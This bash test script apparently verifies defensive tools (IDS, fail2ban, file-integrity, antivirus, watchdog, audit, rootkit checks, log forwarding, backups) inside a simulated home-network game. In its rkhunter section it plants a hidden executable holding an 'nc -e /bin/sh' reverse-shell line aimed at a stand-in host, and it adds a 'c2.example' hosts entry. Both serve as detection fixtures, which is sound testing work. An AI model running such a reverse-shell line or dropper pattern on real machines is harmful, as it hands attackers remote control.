#!/usr/bin/env bash
# Locate the checkout from this script's own path, and use the Go toolchain that
# exists — the author's workspace layout, or one already on PATH.
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT"
if [ -d /workspace/go/bin ]; then
  export PATH=/workspace/go/bin:$PATH GOPATH=/workspace/gopath GOCACHE=/workspace/gocache
elif [ -x "$HOME/.local/tools/go/bin/go" ]; then
  export PATH="$HOME/.local/tools/go/bin:$PATH" GOPATH="$HOME/.local/gopath"
fi

# security_verify.sh — §33 防守和安全软件 over the live entry.
#
# Every tool below is installed from the package manager over the mirror, reads
# its own configuration file, and changes what the world really does: a ban
# drops packets, an IDS alert comes from a scan that really happened, a
# quarantine moves a file, a watchdog restarts a service that was down, a log
# collector that is down really loses lines. The last section watches the
# world's own attacker, which acts on its own clock rather than on ours.
set -u

go build -o /tmp/nh_sec ./cmd/neohome || { echo "BUILD FAILED"; exit 1; }
go build -o /tmp/nh_sshdrive ./tools/sshdrive || { echo "DRIVER BUILD FAILED"; exit 1; }

RUN=/tmp/nh_sec_run
rm -rf "$RUN"; mkdir -p "$RUN"
cp /tmp/nh_sec "$RUN/neohome-sec"
cd "$RUN"

rm -f /tmp/sec_world.gob
NEOHOME_WORLD=/tmp/sec_world.gob ./neohome-sec >server.log 2>&1 &
SRV=$!
trap 'bash "$ROOT/tools/killsrv.sh" >/dev/null 2>&1' EXIT
sleep 2
kill -0 "$SRV" 2>/dev/null || { echo "SERVER DIED:"; cat server.log; exit 1; }

say() { printf '\n########## %s ##########\n' "$*"; }
# The player's own sessions: the household PC (10.77.1.11), the laptop
# (10.77.1.12), the router (10.77.1.1) and the NAS (10.77.1.30) — the addresses
# the world's own LAN allocator seeds (internal/core/addr.go owns the plan; a
# script reaches the world the way a player would, over ssh).
# Each helper ends with an exit so its session closes where it opened — and a
# leading @ is a raw answer to a prompt (sudo's or ssh's password), the same
# convention perm_verify.sh uses.
S() { /tmp/nh_sshdrive alex alex123 "$@" 'exit' 2>&1; }
L() { /tmp/nh_sshdrive alex alex123 "ssh alex@10.77.1.12" alex123 "$@" 'exit' 2>&1; }
N() { /tmp/nh_sshdrive alex alex123 "ssh root@10.77.1.30" nasroot "$@" 'exit' 2>&1; }
R() { /tmp/nh_sshdrive alex alex123 "ssh root@10.77.1.1" admin "$@" 'exit' 2>&1; }
# The NAS reached *through the laptop*, which matters once the PC has been
# banned: an administrator whose own desk has been cut off administers from
# somewhere else, and the ban is per source address, so this door is open.
NL() { L "ssh root@10.77.1.30" '@nasroot' "$@" 'exit'; }
# the world ticks every 3 seconds, and a tick is half a minute of game time
tick() { sleep 6; }
twotick() { sleep 9; }

say "1. the posture a fresh household has — and the attacker that exists anyway"
S 'secstat status' | head -12
echo "--- nothing is defending this house yet, and every tool says so by name ---"
N 'fail2ban-client status' | tail -2
N 'suricata -T' | tail -2

say "2. the scripted DNS fault, repaired the way a player repairs it"
R "mkdir -p /var/run/dnsmasq" "echo nameserver 10.0.0.2 > /var/run/dnsmasq/resolv.conf" | tail -2

say "3. suricata on the NAS: a real scan from the PC becomes a real alert"
N 'apt update' | tail -1
N 'apt install suricata' | tail -3
N 'suricata -T' | tail -8
echo "--- the rules the engine loaded, from the file the package shipped ---"
# the operator's own policing: alert-only here, so section 4 keeps the banning
# story to fail2ban. 8 ports because that is what the PC's nmap sweep covers.
N "printf 'portscan ports=8 window=2m action=alert level=warn\nauthfail fails=5 window=5m action=alert\n' > /etc/suricata/rules" \
  'cat /etc/suricata/rules' 'suricata -T' | tail -9
S 'nmap nas' | tail -10
tick
N 'secstat alerts 3' | tail -4
N 'secstat flows 5' | tail -6
echo "--- the scan is in the flows because those packets really arrived ---"

say "4. fail2ban on the NAS: three bad logins, and the door shuts for one address"
N 'apt install fail2ban' | tail -3
echo "--- the laptop can reach the NAS before anyone is banned ---"
L 'ssh root@10.77.1.30' '@nasroot' 'hostname' 'exit' | tail -3
# the game's ssh takes one password per attempt, like the real thing: three
# separate logins are three separate refusals, recorded by the NAS itself
S 'ssh root@nas' '@wrong' 'ssh root@nas' '@wrong' 'ssh root@nas' '@wrong' | tail -9
tick
echo "--- the ban is enforced on the wire: the PC's next connection times out ---"
S 'ssh root@nas' | tail -2
echo "--- and the same door is still open for a different address ---"
L 'ssh root@10.77.1.30' '@nasroot' 'hostname' 'exit' | tail -3
echo "--- what the jail knows, read from a session that is not banned ---"
NL 'fail2ban-client status' | tail -8
NL 'secstat bans' | tail -3
echo "--- recovery: the operator lifts exactly the address the jail reports ---"
banned=$(NL 'secstat bans' | grep 'expires' | awk '{print $1}' | head -1 | tr -d '\r')
echo "lifting the ban on ${banned:-<none>}"
NL "fail2ban-client set sshd unbanip ${banned}" | tail -2
NL 'secstat bans' | tail -2
S 'ssh root@nas' '@nasroot' 'hostname' | tail -3

say "5. aide on the PC: a baseline, a real change, and the alert that names it"
S 'sudo apt update' '@alex123' | tail -2
S 'sudo apt install aide' '@alex123' | tail -3
# an unprivileged operator writes in their own home and installs the file as
# root, which is what /etc being root-owned really means
S "printf 'watch = /etc/cron.d\nwatch = /etc/hosts\ninterval = 1m\nfreshfiles = true\n' > /home/alex/aide.conf" | tail -1
S 'sudo cp /home/alex/aide.conf /etc/aide/aide.conf' '@alex123' | tail -1
S 'sudo aide --init' '@alex123' | tail -3
S 'sudo aide --check' '@alex123' | tail -2
echo "--- a clean check above; now a change the baseline has never seen ---"
S 'cp /etc/hosts /home/alex/hosts.new' | tail -1
S "printf '10.66.6.6  c2.example\n' >> /home/alex/hosts.new" | tail -1
S 'sudo cp /home/alex/hosts.new /etc/hosts' '@alex123' | tail -1
twotick
S 'secstat alerts 3' | tail -4
S 'sudo aide --check' '@alex123' | tail -4
echo "--- the monitor raised the alert, and the check names the file ---"

say "6. clamav on the laptop: a mirror update, a find, and a real quarantine"
L 'sudo apt update' '@alex123' | tail -2
L 'sudo apt install clamav' '@alex123' | tail -3
echo "--- no database yet: the scanner refuses to pretend ---"
L 'clamscan -r /home/alex/Downloads' | tail -3
L 'sudo freshclam' '@alex123' | tail -3
L 'clamscan -r /home/alex/Downloads' | tail -8
echo "--- EICAR is a test string on purpose: that is what a find looks like ---"
L 'sudo clamscan --move=/var/quarantine -r /home/alex/Downloads' '@alex123' | tail -5
echo "--- the file really moved: it is no longer in Downloads ---"
L 'ls /home/alex/Downloads' | tail -3
L 'sudo ls -l /var/quarantine' '@alex123' | tail -3
L 'secstat quarantine' | tail -2

say "7. monit on the PC: a service that was stopped comes back on its own"
S 'sudo apt install monit' '@alex123' | tail -3
S 'printf "check service sshd maxdown=2 interval=1m action=restart\n" > /home/alex/monitrc' | tail -1
S 'sudo cp /home/alex/monitrc /etc/monit/monitrc' '@alex123' | tail -1
S 'sudo systemctl restart monit' '@alex123' | tail -1
S 'sudo systemctl start sshd' '@alex123' 'systemctl status sshd' | tail -3
S 'sudo systemctl stop sshd' '@alex123' | tail -1
tick
echo "--- one failed check is not enough (maxdown=2): still down after the first ---"
S 'systemctl status sshd' | tail -2
twotick
S 'systemctl status sshd' | tail -3
S 'monit summary' | tail -5
echo "--- two failed checks, one restart: the watchdog is a service, not a report ---"

say "8. auditd on the NAS: what the kernel records, and what it does not"
N 'apt install auditd' | tail -3
N 'auditctl -l' | tail -7
N 'echo "# auditd was here" >> /etc/passwd' | tail -1
N 'echo "x" >> /etc/hosts' | tail -1
N 'ausearch -k exec' | tail -8
echo "--- every command run is a record: that is what -S execve buys ---"
N 'ausearch -k identity' | tail -4
echo "--- /etc/passwd is watched, so that write is there; nothing names /etc/hosts ---"
N 'ausearch -k hosts' | tail -2

say "8b. rkhunter on the PC: the host watching itself, with and without a baseline"
S 'sudo apt install rkhunter' '@alex123' | tail -3
echo "--- no baseline yet: a check with nothing to compare against says so ---"
S 'sudo rkhunter --check' '@alex123' | tail -2
S 'sudo rkhunter --propupd' '@alex123' | tail -2
S 'sudo rkhunter --check' '@alex123' | tail -3
echo "--- a clean host; now a change the baseline has never seen ---"
S 'printf "#!/bin/sh\nnc -e /bin/sh 198.51.100.9 4444\n" > /home/alex/.update' | tail -1
S 'chmod +x /home/alex/.update' | tail -1
S 'cp /home/alex/.update /tmp/.cache-helper' | tail -1
S 'sudo rkhunter --check' '@alex123' | tail -6
echo "--- the periodic check raises the same finding as an alert, on its own ticks ---"
twotick
S 'secstat hids' | tail -6
S 'secstat alerts 3' | tail -4

say "9. central logs: the router forwards, the NAS keeps, and a dead collector loses lines"
R 'cat /etc/config/system' | tail -4
R 'logger -t firewall wan-input-dropped-port-23' | tail -1
tick
N 'secstat remote gateway' | tail -3
echo "--- and on the router's own console, the line it wrote ---"
R 'logread' | tail -2
N 'systemctl stop rsyslog' | tail -2
# the sender complains only once every ten ticks, like a rate-limited daemon
seen=0
for i in $(seq 1 10); do
  R 'logger -t firewall wan-input-dropped-port-22' >/dev/null
  if R 'logread' | grep -q 'could not forward'; then seen=1; break; fi
  sleep 3
done
if [ "$seen" = 1 ]; then
  R 'logread' | tail -3
else
  R 'logread' | tail -2
  echo "--- the line is gone from the wire; the sender's complaint is rate-limited ---"
fi
N 'secstat flows 6' | tail -6
echo "--- the NAS was not listening, and the refused attempts are in its own flows ---"
N 'systemctl start rsyslog' | tail -2
tick
R 'logger -t firewall wan-input-dropped-port-25' >/dev/null
tick
N 'secstat remote gateway' | tail -3
echo "--- lines written while the collector was down are simply gone ---"

say "10. the world's own attacker, on its own clock"
# The scanner sweeps every 97 ticks — about five minutes of real time — and the
# household's own router is one of the addresses it sweeps, so its probes are
# in the router's own record. Nothing here is scripted: those are real Dial()
# attempts from a real device with a real address.
echo "looking for the scanner's sweep in the gateway's flows..."
found=0
if R 'secstat flows 60' | grep -q 'scan-host'; then found=1; fi
if [ "$found" = 0 ]; then
  for i in $(seq 1 24); do
    sleep 12
    if R 'secstat flows 60' | grep -q 'scan-host'; then found=1; break; fi
  done
fi
R 'secstat status' | tail -10
R 'secstat flows 40' | grep -E 'scan-host|:22|:23|:80' | tail -10
if [ "$found" = 1 ]; then
  echo "--- those attempts are real flows from a real address, swept on a schedule ---"
else
  echo "--- the sweep has not fallen inside this window; secstat flows will show it ---"
fi

say "11. restic on the PC: a repository, two snapshots, and a restore"
S 'sudo apt install restic' '@alex123' | tail -3
S 'printf "RESTIC_REPOSITORY=/srv/restic\nRESTIC_PASSWORD_FILE=/etc/restic/password\n" > /home/alex/restic-env' | tail -1
S 'sudo cp /home/alex/restic-env /etc/restic/env' '@alex123' | tail -1
# on a machine with no sudo the repository is a directory the operator may not
# write: the refusal is the real one, and root fixes it
S 'sudo mkdir -p /srv/restic' '@alex123' | tail -1
S 'sudo chown root:root /srv/restic' '@alex123' | tail -1
S 'sudo restic init' '@alex123' | tail -2
S 'sudo restic backup /home/alex' '@alex123' | tail -3
echo "--- now the mistake a backup exists to survive ---"
S 'cp /home/alex/notes.txt /home/alex/notes.keep' | tail -1
S 'rm /home/alex/notes.txt' | tail -1
S 'sudo restic backup /home/alex' '@alex123' | tail -3
S 'sudo restic snapshots' '@alex123' | tail -4

say "12. restore, and a repository whose bytes were tampered with"
# the older snapshot's id, straight out of `restic snapshots` (the ID column)
first=$(S 'sudo restic snapshots' '@alex123' | awk '$1 ~ /^[0-9a-f]+$/ && length($1) == 8 {print $1; exit}' | tr -d '\r')
echo "restoring the older snapshot ${first:-<none>}"
S "sudo restic restore $first" '@alex123' | tail -3
S 'head -2 /home/alex/notes.txt' | tail -3
echo "--- the file is back: a backup that restores is the only kind that counts ---"
S 'sudo restic check' '@alex123' | tail -2

# Now corrupt one blob — the blob that holds notes.txt, named by the manifest
# itself. A blob is named by the hash of its bytes, so this is the one mistake
# a content-addressed store can still detect.
manifest=$(S "sudo restic cat $first" '@alex123')
blob=$(printf '%s\n' "$manifest" | awk '$1 == "file" && $5 == "/home/alex/notes.txt" {print $4; exit}')
blobpath="/srv/restic/data/${blob:0:2}/$blob"
echo "overwriting $blobpath with different bytes"
S "sudo cp /etc/hostname $blobpath" '@alex123' | tail -1
S 'sudo restic check' '@alex123' | tail -3
echo "--- check re-hashes the blobs, so corruption is a fact and not a fear ---"
# and the corrupted bytes cannot be restored back into the live tree
S 'sudo rm /home/alex/notes.txt' '@alex123' | tail -1
S "sudo restic restore $first" '@alex123' | tail -3
S 'ls /home/alex/notes.txt' | tail -2
echo "--- restore refuses them by name, and the file stays gone: a backup is only"
echo "    as good as the copy you keep where the corruption cannot reach it ---"

echo
echo "security_verify: done"
echo "(tool intervals run on the world clock, not on wall time: a tick is 30s of"
echo " game time, aide re-checks on its own ticks, the scanner sweeps every 97"
echo " ticks, and every one of those facts is read back with secstat)"
